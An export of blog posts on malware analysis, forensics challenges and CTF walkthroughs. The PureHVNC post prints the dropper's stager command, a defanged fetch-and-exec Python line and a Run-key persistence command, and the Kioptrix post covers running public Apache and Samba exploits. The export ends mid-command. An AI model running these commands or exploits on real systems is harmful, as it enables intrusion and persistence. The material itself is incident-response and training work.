[ { "title": "Seven - Malware Analysis - Multi-Stage PureHVNC RAT - Part of PXAStealer", "url": "/posts/Seven-PureHVNC-Dropper/", "categories": "Days of Security, Reverse Engineering, Incident Response, Malware Analysis", "tags": "Malware Analysis", "date": "2025-08-06 01:00:00 +0530", "snippet": "IntroThis piece of malware was spotted in one of the incident for which I led the response. It was executed, undetected by Defender for Endpoint and garned a full fledged IR investigation. I will not mention the whole IR process as this focuses more on the analysis of the dropper which was a multi-stage heavily obfucated python script &amp;amp; C# binary.To give more context to it. It was a PXAStealer attack as seen on SentinelOne. SentinelOne focused more on the PXAStealer(DLL) aspect, whereas this one is a later step in the infection chain leading to persistence. All the IoCs will be mentioned in the appendix.How we got here?The user received a phishing link on their personal email address and opened it on their corporate device and it started the infection. It originated through a .lnk file which is consistent with previous PureHVNC and PXAStealer infections. The .lnk file included a obfuscated script which initiated the download of a master zip archive.That was followed by the creation more zip archives with .pdf extension which originated from master zip file and were extracted. Python launcher, malicious dll(PXAStealer) and all dependencies were extracted from the zip archives in the “C:\\Users\\Public\\Windows&quot; directory and once the DLL was sideloaded into MS Word binary, it executed the below mentioned command and which in turn exectued python script in memory. I can’t share the screenshots or more information as it might contain senstive information. From the very beginning, the attack happened mainly through memory only. Here’s the initial stager command from the sideloaded DLL.cmd /c cd &quot;&quot; &amp;amp;&amp;amp; start &quot;Google Ads Playbook.docx&quot; &amp;amp;&amp;amp; certutil -decode Document.pdf Invoice.pdf &amp;amp;&amp;amp; images.png x -ibck -y -poX3ff7b6Bfi76keXy3xmSWnX0uqsFYur Invoice.pdf C:\\\\Users\\\\Public &amp;amp;&amp;amp; del /s /q Document.pdf &amp;amp;&amp;amp; del /s /q Invoice.pdf &amp;amp;&amp;amp; del /s /q images.png &amp;amp;&amp;amp; del /s /q &quot;Contract Invoice.docx&quot; &amp;amp;&amp;amp; del /s /q &quot;Evidence Report.docx&quot; &amp;amp;&amp;amp; cd C:\\\\Users\\\\Public\\\\Windows &amp;amp;&amp;amp; start svchost.exe Lib\\\\images.png MR_Q_NEW_VER_BOT &amp;amp;&amp;amp; exit &amp;amp;&amp;amp; exitSadly I can’t share the info on the very initial payload which initated the download due to undisclosable reason hence, the lack of information in this step. But the silver lining is that we have the actual malicious payload and we know the methodology followed by the stager. Let’s begin with the actual payload. All the IOCs will be mentioned in the appendix.Initial scriptThe initial payload is a python script which is executed in memory with the following commandsvchost.exe -c &quot;import.requests;exec(requests.get(&#39;hXXp://0x0[.]st/8nyT.py&#39;).txt)&quot;That syntax oddly looks like python execution. Upon checking the hash of this extracted svchost, it was confirmed to be a normal python executable only.Here’s a small snippet of the script, it has strange function definitions and one huge chunk of encrypted text.It is base85 encoded, zlib compressed and a marshal code. I wrote a quick script to decode it.import base64, zlibwith open(&quot;weird.txt&quot;, &quot;r&quot;) as f: b85_data = f.read().strip()decoded = base64.b85decode(b85_data)decompressed = zlib.decompress(decoded)with open(&quot;decompressed.bin&quot;, &quot;wb&quot;) as f: f.write(decompressed)This small script left us with marshal code. Since marshal code can only be decompiled with the python version it was written in, it took a little bit of hit and trial and with the help uncompyle6 and python 3.8.18 it was decoded.Second StageAfter following the decryption routine of the first script and decompiling the marshal code, the second script is visible.The second script also follows a similar footprint but with a lot more rigorous encryption. There is base85, zlib, AES, xor, RSA and a custom rc4 decryption routine. A private key is also included. This the decryptor function &amp;amp; exec function To decrypt the payload from this script, the most convenient way is to use the existing decrytion function. In this instance it was quite troublesome to get the marshal code to decompile like earlier method, so I opted to extract the python bytecode disassembly.The decompiled bytecode gave quite a lot of information including the info on the target executable, which is RegAsm.exe. There are two payloads, one is a portable executable and second one is a shellcode. Before we dig into these, let’s take a look at this script.This is a full-fledged process injection script with custom RC4 decryption logic. Both the payloads, PE &amp;amp; Shellcode use different keys for decryption. It first creates a suspended RegAsm.exe and attempts to inject the PE into it. If that fails it injects the shellcode payload into it’s own process (svchost.exe or rather pythonw.exe in this case) and executes it. For the sake of readability, the screenshots are of the python code generated from the bytecode.Custom RC4 and PE injection function. Fallback Shellcode injection function. Third StageNow it is time to move on from the python scripts. After base64 decode and RC4 decryption with my own script, It reveals two payloads C# PE (Which is injected into RegAsm.exe) Donut Shellcode (Which is the failsafe method if the PE injection fails)Both are the same payloads just primary and failsafe delivery methods.Here will start with the C# file which is our normal .NET executable.When looking it under CFF explorer, there is some unusual data.It turned out to be another base64 payload. Which is much more evident when the file is explored in dnSpy.It also reveals that the original file name is Wdckghr_crypted. It hold one key and one base64 and xor’ed text. And it attempts to use textbook methods to patch AMSI &amp;amp; ETW to seemless script execution.AMSIThese functions collect the address of AMSI buffer in memory &amp;amp; patches the AMSI in such a way that it will always return 0x80070057(64-bit), which is the error code for invalid argument.ETWSimilarly these collect the address of ETWEventWrite in memory &amp;amp; patches the ETW so that function will just “return”(Decoded payload - “C3”) and do nothing.Below are the functions responsible for decoding and executing the next stepsOne small python script later, we have the next stage executable.Fourth StageSimilar to the previous stage, it is another C# file. Just in this case, instead of a long base64 string, we have a byte array and the original name of the file is Sydxj.exe. This is .Net Reactor obfucated file but we don’t really need to know about it much as it just follows a decryption routine, nothing else.The main function is simply calling the MeasureSpec() which in turn is responsible for decoding the byte array.Drcryptor function Byte arrayAs seen in the decryptor function, It call the function mentioned below which passes the execution to the final payload by call the function “PopSetStack()”. To decode the byte array, I simply decided to patch the MeasureSpec() and modify it to dump the code instead of passing the execution to the next stage.And voila! We have final stage payload.Final stageThe final payload is a DLL file, which is once again written in C#, making it “semi” easier to analyse. Once again this dll is protected by .NET Reactor obfuscator by Eziriz which makes trying to read it normally exponentially hard. But luckily there is a tool call .NET Reactor Slayer which made is super simple to deobfuscate and read with dnspy.Jumping straight into the PopSetStack() function as it was seen being called by the previous stage. This function simply calls another function(RequestAttachedClient()) which is responsible for initiating and maintaining a connection to the C2 server as seen below.In short what the function is doing maintaining proper communication with the C2 and if the communication breaks, it attempts to reconnect.This whole function is a loop executed with the help of labels. RequestCombinedClient() is used to extract C2 details and Cert and it saves it to containerSummarizer SendDetachedClient() is basically a flag. If it is set to be true, it means that the connection is established and it will be actively listening/reading information from C2 under the label IL_02DA. If it is set to false it will go to label IL_007F and retry connection Under the label IL_007F it disposes all the variables set like previous SSLStream, Timer(matcherClient) and basically resets connection. I will not be going into the depths of the all functions seen here but the gist is thereTo gather the C2 information, there another base64 and Gzip compressed text.One quick run to the CyberChef platform and we have the C2 information and a certificate.Processing it with OpenSSL, it gives out valuable informationIf you’ve noticed there doesn’t seem to be any kind of execution happening. After proper analysis of the other functions, it seems to be quite a modular RAT. It appears to be collecting other modules, binaries and/or commands from the C2 after the initial connection. The data which it receives is gzip compressed, which is decompressed by TokenizeBasicSingleton() through JoinAuthorizer(). One more important thing - It uses protobuf library to deserialize data from C2.It stores unique fingerprint of the infected system in “SOFTWARE//{runtime-generated-data}” registryFor persistence, it adds the very initial stager command in the HKCU{User SID}\\Software\\Microsoft\\Windows\\CurrentVersion\\Runcmd /c start C:\\Users\\Public\\Windows\\svchost.exe C:\\Users\\Public\\Windows\\Lib\\images.png MR_Q_NEW_VER_BOTThe mutex for this variant is “def” and it checks for this mutex before execution. Below are a couple of screenshots from wireshark. One with internet enabled and one without.AppendixIOCsHashes -61c0515c70a2b451d3d59f9450e5bd060f73290214ae6a6990db6adc04d534a7 - Initial lnk file6a51160fd443d4ddf69e0424d494e12436fbe0898756eeae6c79c77718760516 - Sideloaded DLL(PXAStealer) 96637bc629ca866ab5aa176e7ccb3cff9f93c8f9d021520a97f527bfa9d56d7e - Wdckhgr_crypted - First stage after python execution289c09d43faaae05702f477f648dfd336085983f8253f834acd24960469335b7 - Donut shellcode5baa860a2ee10bc859f527c686ec8f25b74860fe5d0f9138f8c7aeeb8dade7f4 - Sydxj - Intermediary stagecb783c1e27455f90fdd558d2a10604e35f830b7a07e0d820d3e2b49f17d1f787 - Sctgvth - Final DLLC2 -162[.]218[.]115[.]218 (Connected on remote port 5600X)Certificate Fingerprint - SHA1 Fingerprint=CA:08:3A:47:C9:D5:C5:9B:FA:33:AB:56:97:8E:4D:1F:7B:5B:00:17" }, { "title": "Six - TryHackMe - IronShade Linux Forensics Challenge", "url": "/posts/Six-Linux-Forensics-IronShade/", "categories": "Days of Security, Digital Forensics, Linux, TryHackMe", "tags": "Digital Forensics", "date": "2025-07-21 01:00:00 +0530", "snippet": "IntroIronShade is a medium difficulty linux forensics challenge. The story goes something like this - we’ve setup a honeypot and have intentionally exposed a weak SSH and other ports to get attacked by an attacker. One such honeypot was compromised and now we’re supposed to analyse what steps did the attacker take to compromise the machine and maintain persistence.Although it is a medium difficulty challenge, it didn’t took as long as I expected it to take.Question 1What is the Machine ID of the machine we are investigating?Hostnamectl is the simplest way to get this.Question 2What backdoor user account was created on the server?For this question we can either check /etc/shadow, /etc/passwd or auth.log in case the user has been deleted. In this instance shadow file was more than enough.Question 3What is the cronjob that was set up by the attacker for persistence?We have to check the crontab for all users. A simple one liner can do it. This one liner just collects all the usernames from the /etc/passwd file and iterate over the user list and list the cronjobs.for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l; doneIn this instance, root had the cronjob which we were looking for. printer_app is an ELF file.Question 4Examine the running processes on the machine. Can you identify the suspicious-looking hidden process from the backdoor account?“ps” is our friend when it comes to anything related to running processes. If the process is killed/died we can look for the same in Syslog/Sysmon, auditd or journalctl. Since in this case it is a running process, “ps” should suffice.ps -auxCommand explanation --a - Show processes for all users-u - List users along with process info-x - Show background processes as wellSince we knew the malicious user account, I added a small grep as well.Question 5How many processes are found to be running from the backdoor account’s directory?The answer to this question can be found with last question only.Question 6What is the name of the hidden file in memory from the root directory?The “in memory” part of the question confused me but checking the root directory showed a somewhat misplaced hidden file and it was the solution.Question 7What suspicious services were installed on the server? Format is service a, service b in alphabetical order.Systemctl is the way to go when it comes to services in linux. This command from a previous room on TryHackMe linux forensics does it all. (The benefits of keeping notes!!)sudo systemctl list-units --all --type=serviceA little bit of scrolling and we have the solution.Bonus service info -Sys_backup doesn’t seem to exist. When checking in the Syslog, it was also visible that the file sys_backup never existed and it never ran successfully.Not getting sidetracked anymore, moving on to the next questionQuestion 8Examine the logs; when was the backdoor account created on this infected system?Auth.log is of utmost importance when it comes to user related evidence. A quick grep we can view when the user was created.This screenshot revealed one more thing. There was one more user which was created. That is worth investigating as well.It seems nothing much happened with this user. The user has been deleted and the rdp_updater doesn’t exist either. Since the VM is not connected to the internet there’s no way I could analyse this further without proper tools.Question 9From which IP address were multiple SSH connections observed against the suspicious backdoor account?Auth.log for the win here as well.cat auth.log* | grep -a mircoserviceQuestion 10How many failed SSH login attempts were observed on the backdoor account?Once again a little bit of auth.log scrolling and we have the answer.Question 11Which malicious package was installed on the host?For this question we can check the dpkg logs. It holds the logs for installation and deletion of all the packages.cat dpkg.log | grep &quot;install &quot;One application stands out and it was the malicious package.Question 12What is the secret code found in the metadata of the suspicious package?This time around, instead of dpkg logs we can simply check the dpkg list with the filter of the package which we came to know about in the last question.dpkg -l | grep pscannerThis concludes this room. I did revisit the questions and attempted to get the information through OSQuery and I learnt a lot more from that method but I didn’t capture screenshots for that. So in this blog, we only get the simplistic method where we query and read everything manually. I wonder how much of it can be automated." }, { "title": "Four - TryHackMe - Diskrupt Forensics Challenge", "url": "/posts/Four-Diskrupt-THM/", "categories": "Days of Security, Digital Forensics, Incident Response, TryHackMe", "tags": "Digital Forensics", "date": "2025-07-13 01:00:00 +0530", "snippet": "IntroDiskrupt is a hard difficulty digital forensics challenge. The main objective is to fix the damaged disk, analyse the file system, and recover the deleted files. There are 12 questions as part of this challenge. My goal here is not to provide a walkthrough but to demonstrate my capabilities and my thought process so there might be some rambling and side-tracks here.We’re provided with a supposedly corrupted disk image from the user’s device. The user is suspected of stealing cutting edge research from the lab and erasing her traces. These are the tasks as an Analyst - Fix the damaged disk Examine the partitions Find evidence of access to sensitive research documents If any files were deleted or tampered with What are the hidden files on the disk Carve out important files deleted from the diskAlong with the task questions I will be answering these questions at the end as well.Question 1What are the corrupted bytes in the boot sector that caused the disk to be damaged?Looking at the disk initially in FTK imager, we can see a populated MBR sector. It contains two partitions, boot drive being NTFS &amp;amp; the other being FAT32. Both are highlighted in different colours.One thing which pops out instantly is that the MBR signature is not correct. “AC DB” is not the correct signature as highlighted in the above screenshot (turquoise color). It should be 55 AA.This answers our first question. The corrupted bytes are ACBD.This can be very quickly fixed using something like HxD. This makes me wonder how can we go around fixing boot sector in worse condition and how can we go around damaging it. I guess that is something for a future article.Question 2What are the bytes representing the total sector of the second partition? (Little Endian)This question has quite a simple approach as well. I already have the file open in HxD so knowing how to read the partition section of MBR helps with this. Referring to my notes, I know the last 4 bytes refer to the total sectors. So for second partitions, the answer is highlighted below.This number comes out to be 20477952. This will help us in the next question.Question 3What is the size of the first partition in GB? (up to 2 decimals e.g: 15.25)This question was so hard for the so wrong reasons. It is explicitly mentioned that the answer should be in GB AND NOT IN GiB. But the task took the answer in GiB.Anyhow, to find the answer, we will be multiplying the number of sectors in a partition with 512, which is the standard sector size in MBR. For first partition, the sector size is highlighted.The number comes out to be 63401984, after multiplication and proper conversion, the size of the first disk comes out to be 30.23 GiB (Not GB)Question 4What is the size of the second partition in GB? (up to 2 decimals e.g: 15.25)We already calculated the number of sectors for second drive in Question 2, so building upon that, I’ll multiply the number i.e. 20477952 with 512 and convert the result to GiB. The answer comes out to be 9.76 GiB.Question 5In the NTFS partition, when was the text file related to the password created on the system?From here on out, the questions require to open the file in something like Autopsy or use EZTools. Make sure to save the file in HxD with correct MBR signature before loading into Autopsy!I want to use both tools in conjunction. So I imported the the image with Keyword search &amp;amp; Recent activity ingest modules enabled.This question can be easiliy answered by using MFTExplorer or MFTECmd tool from EZ tools suite so while the Autopsy was importing the image, I decided to go ahead with this approach.First I exported the $MFT using FTK ImagerNext, parse it using MFTCmd.exe and import into Timeline ViewerA quick search for txt files, and a small amount of scroll later, the file was found.Question 6What is the full name of the sensitive pdf document accessed on this disk?For this question, my Autopsy import was completed so I decided to check out the recent files. It was a simple as that.It is good to note that this file has been deleted.Question 7When this file was first found on this disk?The simplest way to answer that is to refer back to our trusty MFT file. Now we know what we’re looking for and our answer is one search away.Question 8What is the entry number of the directory in the Journal that was created and then deleted for exfiltration purposes on the disk?For this question we’ll need the journalling capabilities of NTFS filesystem. The journal file in an NTFS system is located at root\\$Extend\\$USNJrnl\\$J.Similar to MFT, MFTCmd can be used to parse the data, and once parsed, can be viewed in Timeline Explorer.In Autopsy I found a deleted Zip file. Given the name and it’s deleted nature, I figured that this is the directory which is being referred to here.One quick search in the journal file and we have our entry number for the directoryQuestion 9What is the starting offset of the first zip file found after the offset 4E7B00000?With this we pivot back to the hex view of the disk. It is a very simple question as well. All we have to do is to go to the mentioned offset and search for the magic number of the Zip file which is “50 4B 03 04”. Simple as that.Question 10What is the ending offset of the zip file?To find the ending offset of the file, we’re only required to search for the trailer/footer hex values for a zip archive which comes out to be “50 4B ????????????????? 00 00 00”. referenceQuestion 11What is the flag hidden within the file inside the zip file?Since we have the file in hex form, all we have to do is to carve it out. I used cyberchef to carve the file out and get the super secret file. We can also use varied tools like scalpel, foremost etc.The best part is, that we don’t even need to carve out the deleted file. There is another partition which has been deleted. If we open that in FTK Imager we can see the deleted zip &amp;amp; the secret file.Question 12In the FAT32 partition, a tool related to the disk wiping was installed and then deleted. Can you find the name of that executable?For this one, once again we have a very simple method. The FTK way. It is right there in the root section.Now for the question for the Analyst - Fix the damaged diskIt was a quick signature fix. Examine the partitionsThere were two partitions, one NTFS and second, FAT32, which was deleted. Find evidence of access to sensitive research documentsIn Autopsy &amp;amp; MFT Explorer we could see the user accessed and deleted the sensitive pdf file. If any files were deleted or tampered withYes, multiple file were deleted as can be seen in FTK imager’s screenshots and in the autopsy’s bin What are the hidden files on the diskThe whole partition FAT32 could be considered as hidden which contained quite a lot of evidence of malicious activity. Carve out important files deleted from the diskWe were able to carve out their exfiltration plan from the disk image and other solid evidence was also visible.Up next, expect environment update &amp;amp; a lot more DFIR projects!" }, { "title": "Three - PMAT Lab - Bonus Binary Malware Analysis", "url": "/posts/Three-ImageExfil-PMAT/", "categories": "Days of Security, Malware Analysis, PMAT", "tags": "Malware Analysis", "date": "2024-11-02 01:00:00 +0530", "snippet": "IntroSo with my time being completely MIA and being lazy, I just want to mention that I was learning Malware Analysis and I have gained somewhat of a foothold in the same. This blog is just to highlight the same and share the first report that I wrote for a binary. Albeit it was a sample binary which is a part of the Practical Malware Analysis course from TCM Security. I still feel that it is a beginning to something interesting, as I really really enjoyed my time working on the same and learning Malware analysis from scratch.Bonus Binary from PMAT LabsThe binary, as I called it, is an ImageExfil malware, and as the name suggests, it is a exfiltration malware sample. It is a Nim compiled binary that run on 32/64 bit Windows operating system. It consists of one payload only which when is able to ping to a specific domain, starts with the exfiltration of cosmo.jpeg that is stored on the desktop of the system. The URLs are listed in report. A lot of encoded DNS requests are done from the endpoint and it seems to be in a constant loop.ReportI’ll be attaching the link to the report that is uploaded to my github reporsitory here. Please feel free to take a look at it. It contains all the data and I have written it as proper report following the template I found on the PMAT lab repository. The next few reports will be much more professional as I plan to review different reports and different bits of malware. And I am really excited to deep dive into Malware Analysis &amp;amp; Research and Threat Inteliigence in general. I do plan to implement the newly learned skills in my current workplace and hope it brings more value to me as a professional as well.Looking forward to share more analysis in the future." }, { "title": "Two - LetsDefend - PCAP Analysis Challenge", "url": "/posts/Two-PCAP-Analysis/", "categories": "LetsDefend, Days of Security", "tags": "LetsDefend, WireShark, easy, PCAP, Network Traffic Analysis", "date": "2024-02-27 22:00:00 +0530", "snippet": "IntroPCAP Analysis Challenge is a relatively easy challenge where we’re provided with logs from P13’s computer and we’re supposed to answer the questions.PCAP? What is that?PCAP stands for packet capture. This blog is made up of many small packets which were transmitted to your system when you entered the URL and pressed enter. A packet capture file basically captures all the traffic(or packets) that are being captured and stores them for further analysis. There are a huge number of packets, that too with different protocols and ports, travelling to and from our machines so it is nearly impossible to analyse them manually. That is why we use WireShark. Probably the most used tools for network analysis.With this challenge, we will get a general overview of WireShark and PCAP analysis.Question 1In network communication, what are the IP addresses of the sender and receiver?Answer Format: SenderIPAddress,ReceiverIPAddressHint: Find the chat. Sender: P13The first challenge is very straight-forward. P13 communicated with someone over chat. We have to find packets containing the chat and we will be able to find the sender and receiver IP address. We can simply put a filter to search for the user “P13”. We bascially want the frame to contain “P13”. We will use the following filter to search the same. (Reference)frame contains &quot;P13&quot;After applying the filter, we ca see that packets containing the conversation between P13 and CU713. And we have our first answer.Question 2P13 uploaded a file to the web server. What is the IP address of the server?Here we come to know that P13 uploaded a file to some server. Uploads are usually done with POST requests(More info on POST requests here). So we can simply use another filter for HTTP request and find our upload log. We’ll use the following filter.http.request.method == POSTWe have our destination IP address now. Third question is pretty much interconnected, let’s head on to the TCP stream and see the packets in-depth.Question 3What is the name of the file that was sent through the network?The answer for this question is right there in the same packet as seen in the last segment. With the TCP stream open, we can clearly see the uploaded file’s info.Question 4, 5What is the name of the web server where the file was uploaded?What directory was the file uploaded to?Closing the TCP stream window, in the following stream, we can see a response HTTP packet from the server. We should be able to find info about the server in the HTTP header. Let’s open that up as well.We find not just the answer to the 4th question related to the server info, but we can also see the uploads folder which is the next question. Hence, we hit two birds with one stone.Question 6How long did it take the sender to send the encrypted file?Hint: Check conversations on WireSharkThe hint leads to the right place to check the time it took for the sender to send the encrypted file. Let check the conversations tab under statistics tab.We’ll head on to the IPv4 section and look for our server’s IP address.And voila! We can see the answer in the duration section and with this our challenge is completed." }, { "title": "One - Kioptrix 1 Writeup", "url": "/posts/One-Kioptrix-1/", "categories": "Vulnhub, Days of Security", "tags": "vulnhub, metasploit, easy, exploit, vulnerability", "date": "2024-02-10 22:00:00 +0530", "snippet": "IntroKioptrix 1 is a boot2root style box, where the main objective is to gain root access on the machine in any way possible. For this machine, we don’t get any flags to flaunt.EnumerationTo begin with, we will start a quick nmap scan to identify all the open ports and possibly all the services which are running on those open ports as well. I like to use the following tags and scan all the open ports on the machine. It might be time consuming but it is better to be thorough than missing something crucial.nmap -sC -sV -sT -p- --open $IPNmap scan report for 192.168.0.108Host is up (0.0021s latency).Not shown: 65529 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 2.9p2 (protocol 1.99)| ssh-hostkey: | 1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)| 1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)|_ 1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)|_sshv1: Server supports SSHv180/tcp open http Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)|_http-title: Test Page for the Apache Web Server on Red Hat Linux| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b111/tcp open rpcbind 2 (RPC #100000)|_rpcinfo: ERROR: Script execution failed (use -d to debug)139/tcp open netbios-ssn Samba smbd (workgroup: MYGROUP)443/tcp open ssl/https Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b|_http-title: 400 Bad Request| sslv2: | SSLv2 supported| ciphers: | SSL2_RC4_64_WITH_MD5| SSL2_RC4_128_WITH_MD5| SSL2_RC2_128_CBC_EXPORT40_WITH_MD5| SSL2_RC2_128_CBC_WITH_MD5| SSL2_RC4_128_EXPORT40_WITH_MD5| SSL2_DES_64_CBC_WITH_MD5|_ SSL2_DES_192_EDE3_CBC_WITH_MD5|_ssl-date: 2024-02-10T09:00:53+00:00; +1h01m49s from scanner time.|_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--| Not valid before: 2009-09-26T09:32:06|_Not valid after: 2010-09-26T09:32:061024/tcp open status 1 (RPC #100024)Host script results:|_clock-skew: 1h01m48s|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)|_smb2-time: Protocol negotiation failed (SMB2)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 28.73 secondsHere is a quick description of all the tags used - -sC: Instrcut nmap to use all the default scripts -sV: Help identifying the services running on the open ports -sT: Will perform a TCP connect scan -p: Specify which port range to scan. Adding ‘-‘ at the end will scan all the ports –open: Only show open portsKey things to notice here are that we have apache running on port 80 and 443 and we have samba up as well.Webpage that apache is serving is nothing special. It is just an ancient apache default page with nothing hidden underneath. Directory and DNS scans net no resultNothing was hidden in the source code either.Since, we’re dealing with a rather old version of apache it is not a bad idea to check for known vulnderabilities. Exploitdb is our friend :DWith a quick search we can find multiple buffer overflow exploits for the apache server.Since the exploit is available, it is as easy as just downloading the exploit and running it.We’ll move it from our local exploit-db. If you don’t have it locally you can either get the exploit from the website or you can install it locally with the following commandsudo apt install exploit-dbExploitation Part 1Let’s grab our exploitcp /usr/share/exploitdb/exploits/unix/remote/47080.c . [You can find the exploit ID on the website]gcc -o exploit 47080.c -lcryptoWe’ll add -lcrypto as instructed in the exploit file. Complilation will generate warnings, but we can ignore themIf we try to run it, it will give us a very helpful “help” menu.The 0x6a and 0x6b seems to be the closest to the version which we are running, so lets try those with default connection value.And easy as that, we have a basic low-level shell! But we’re still far from done!We can notice, that during the process, it is trying to collect a file from the web but it is not able to get it. So we might be missing a part of the exploit.I decided to manually download the file and serve it using an http server to the exploit.To achieve that we need a small modification in the source code of the exploit and recomplie it afterwards.I replaced the web address to my local machine’s IP and port where I’ll be starting my http server as shown below.Once we serve the file, we can see that we directly get root access! With this, we have successfully achieved root on the box.Exploitation Part 2Remember we had a Samba share available with us? Let’s take a look at it as well.Enumeration can be done using enum4linux. It is a samba enumeration binary, built around tools like smbclient, rpclient, and nmblookup.enum4linux $IPGoing through the output it yielded nothing much of interest. But, we never found the version of samba. Neither with nmap nor with enum4linux. It is probably similar to Apache. A bit old and probably with publically available exploit.Let’s try probing it more, this time with metasploit and see if we can find more info. There’s a module in MSF console to enumerate samba version.The version is 2.2.1a. Now we have two approaches, we can go ahead and try to exploit with metasploit or we can go ahead in the same way as we did with apache. Let do both!Since we’re already in msfconsole, let’s do that one first.Seaching for the samba version, we can see multiple exploit for different OS versions. Let’s select the linux oneSet all the necessary values (RHOSTS)set RHOSTS = 192.168.0.108And select a TCP reverse shell as our payload and send it away!With this simple exploit, we got root shell. Onto the other method!It is pretty much exactly the same thing as the apache one and the exploit is identical to the MSF one itself.We’ll not got in-depth with it. You can use the below screenshot as a reference. The exploit id is 22469With this, we’re good to close this machine! If you found another way to root, feel free to share!" }, { "title": "OverTheWire Wargames - Bandits", "url": "/posts/OverTheWire/", "categories": "overthewire", "tags": "overthewire, basics, privlege-escalation", "date": "2022-03-21 10:00:00 +0530", "snippet": "IntroBandits wargame is one of the most basic game and is aimed toward beginners. There are a total of 33 levels and the levels get harder and the underlying vulnerable technology changes. The levels start with a focus on basics of linux and end with some challenges related to git. At the end of each level, we will find either the password to next level, or we will get the ssh key. In this blog I will demonstrate my journey through the game and explain the command wherever required. So let’s start with it!Note - If you want in depth explaination of some particular command, you can google or dig into the man pages as recommended on the OverTheWire website.Level 0Level 0 is as simple as it can get. We are just required to ssh into the server and read the password fileLevel 1In level 1 we are supposed to read a file with a “-“(dash) as it’s name.Level 2Level 2 has us read a file with multiple spaces in the file name.Level 3Here we are supposed to read a hidden file.Level 4In this level we are supposed to find a human readable file from a number of files.I used a simple for loop to iterate through all the files present. We can use grep command to get better output.Level 5To reach level 6 we need to find a file which is: Human-readable 1033 bytes in size Not executableThe solution to this levels looks kind of a handful. Let’s break it down further. We will begin with the find commandfind . -type f ! -executable -exec du -ab {} + “-type f will look for regular files only. ”! -executable” will omit the files with the executable privileges. “-exec” will execute the command which follows it whenever there is a match. du -ab {} + The du command is used within the find command and is run whenever the find command finds a match. Here: -a makes sure that the size for all the files are calculated. -h prints the data in the form of bytes. sort -rh | grep 1033 Here the sort command will first reverse(-r) the sorted results and grep will output the line containing the text 1033.And with this we got the desired output. Level 6Level 6 has us looking for another file with the following properties: Owned by user Bandit7 Owned by group Bandit6 33 Bytes in sizeHere we used the find command similar to previous level but this time we differentiated on the basis of group(-group) and owner(-user). The du command operates similarly as well.Level 7Here we are supposed to find the word millionth and right next to it, we will find the password.Level 8In this one we are supposed to find the unique line of text in the given file.Here we used the uniq command with -u parameter printing only the unique files. And used the sort command as a method to feed the data.Level 9Next up we had to find the humand readlable string followed by “=” characters. We can used the “strings” command for the same.Level 10Here we are supposed to decode the data. We used the inbuilt base64 library to decode.Level 11In this level, the data has been rot13 encoded and we are supposed to decode it. We could’ve used a utility like cyberchef, but the website recommended using tr command.Level 12Next up, we are provided with a hexdump file which has been repeatedly compressed.Here we repeatedly used the following commands to decompress the respective archives.bzip -x datagzip -d datatar -xf dataLevel 13In this one, we were provided with a ssh key file which was conveniently placed in our user’s home directory.Level 14Level 14 introduces us to the netcat utility command. We are required to submit the password of the current user(Bandit14) to port 30000. In the previous level we were provided with a ssh key. To get the password we have to dig into /etc/bandit_pass directory. Once we got the password, we can use the nc command as shown below to complete the level.Level 15Here, the concept is pretty similar to the previous level but this time the connection should be SSL encrypted. For that we used openssl s_client command.openssl s_client -connect localhost:30001After the above command, You just have to enter the password to current level and get the pass to next one.Level 16Level 16 introduces us to another network utility called nmap. We are supposed to find a port running a specific service and using SSL as well. The port range given is 31000-32000. First we will use nmap and afterwards just like previous level, openssl. Note: -sV makes nmap do a service scan, revealing the services running on the open ports.Level 17Here we are just supposed to find the only line which is different in the two provided files. diff command makes it really simple.Level 18In this level, whenever we try to log in using ssh, we are instantly logged out with a message “ByeBye!”. Since we know there is a file called readme in the home directory and we have the ssh password, we can use a utility like scp and transfer the file from the game server to our local system.Level 19Level 19 aims to introduce us to the concept of Setuid bits, I recommend reading about them if you are new to it. Level 20In this level, we are provided with another suid bit binary. It makes a connection to the localhost on a specified port. We are supposed to provide the binary the password of bandit20 and we will get the pass to bandit21.Now the way binary works is that, we have to first start a listener(using nc) on a desired port and make the binary connect to that port. We need both of them to be running concurrently. For that, we will background one process using CTRL+Z and use fg command to bring the desired process up. Once the binary is connected, Using nc we will supply the current password. Next we will switch to the suconnect binary using fg, where the password will be checked. Once verified we will get the password to bandit21, on our nc listener process.Level 21Level 21 introduces us to the cron jobs. These jobs are automatically executed at a certain interval of time. First we’ll check in the cron directory, /etc/cron.d and look for our next bandit’s cron job. It seems to be a simple script, writing the value of the password to a random file in the /tmp directory.Level 22This time around we have another cron job but a tad bit more complex shell script. Here the script is first getting the username of the current user and afterwards md5 hash it. And it uses that same hash to create a file under the /tmp directory with password to next user. To find the hash value and hence the file name, we can simply hash the input ourselves on our local system as we already know what the input is.Images coming soonLevel 23Following the trend, this level also introduces us to another script running after certain intervals. This script executes every script present in the /var/spool/bandit24 directory. For this challenger I wrote a small script to output the password to next level in a file in /tmp directory.Script:Output:Level 24For this level we have a service listening on port 30002. To obtain the password of bandit 25, we need to supply a 4 digit pin-code. We are supposed to brute force it. So once again I wrote a small script to brute force the service with numbers ranging from 0000-9999.Script:Output:Level 25This level introduces us to a new kind of shell, and not a regular ol’ bash. We can actually use the previous user to find out what it reads.Shell:bandit25@bandit:~$ cat /etc/passwd | grep bandit26bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtextbandit25@bandit:~$ cat 